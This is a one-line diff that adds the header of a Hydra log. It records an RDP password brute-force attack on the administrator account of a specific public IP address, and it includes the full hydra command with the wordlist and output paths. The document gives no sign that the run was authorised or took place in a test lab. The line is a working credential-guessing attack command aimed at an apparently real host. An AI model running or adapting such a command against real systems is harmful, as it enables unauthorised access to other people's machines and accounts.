@@ -1,0 +1,1 @@
+# Hydra v9.2 run at 2026-07-28 07:05:18 on 103.24.230.93 rdp (hydra -l administrator -P /tmp/win_pass.txt -t 2 -w 3 -V -o /tmp/fastrdp.txt rdp://103.24.230.93)
